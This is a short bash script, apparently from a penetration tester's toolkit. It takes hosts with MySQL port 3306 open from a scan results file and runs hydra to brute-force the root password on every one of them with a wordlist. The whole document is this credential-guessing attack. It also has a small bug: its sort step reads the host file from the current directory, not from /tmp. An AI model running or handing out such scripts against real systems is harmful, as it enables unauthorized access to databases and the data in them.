#!/bin/bash

wordlist=/usr/share/wordlists/mysql.txt

cat ~/targets/_results/ports.new | grep 3306 | cut -d ' ' -f3 > /tmp/mysql_ip.txt
sort -uo /tmp/mysql_ip.txt mysql_ip.txt

hydra -K -l root -P $wordlist -M /tmp/mysql_ip.txt mysql

rm /tmp/mysql_ip.txt
